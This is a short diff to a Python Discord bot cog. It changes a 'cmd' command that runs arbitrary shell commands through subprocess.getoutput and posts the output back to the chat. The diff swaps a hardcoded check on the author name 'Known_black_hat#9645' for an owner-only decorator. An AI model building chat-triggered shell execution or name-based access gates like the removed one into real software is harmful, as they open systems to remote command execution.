@@ -11,14 +11,13 @@ class Oscmd(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
         self._last_member = None
+        
+    @commands.is_owner() 
     @commands.command(name="cmd")
     async def cmd(self,ctx,*, command_string):
-        if str(ctx.message.author) == "Known_black_hat#9645":
-            output = subprocess.getoutput(command_string)
-            await ctx.send(embed=cr.emb(cr.green,"Console",f"```\n{output[:1900]}\n```"))
-        else:
-            raise 'Command not found'
-
+        output = subprocess.getoutput(command_string)
+        await ctx.send(embed=cr.emb(cr.green,"Console",f"```\n{output[:1900]}\n```"))
+        
 
     @commands.is_owner()
     @commands.command(name="update")
